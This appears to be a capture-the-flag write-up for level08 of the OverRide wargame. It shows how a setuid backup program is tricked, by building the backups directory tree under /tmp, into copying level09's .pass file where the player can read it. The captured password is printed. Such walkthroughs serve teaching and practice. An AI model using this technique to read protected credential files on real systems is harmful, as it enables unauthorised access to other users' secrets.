# level08

The programs takes a file as parameter.

By looking at the code, we can see that it copy the file passed in params to `./backups/argv[1]`. If the file already exists, an error is thrown.

The goal here is to open the `.pass` of the level09, but obviously we haven't the rights to write in the current directory:

```bash
level08@OverRide:~$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
level08@OverRide:~$ mkdir -p backups/home/users/level09
mkdir: cannot create directory `backups/home': Permission denied
```

We move in `/tmp` and create the complete path to avoid any errors:

```bash
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
level08@OverRide:/tmp$ mkdir -p backups/home/users/level09
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ cat ./backups//home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```
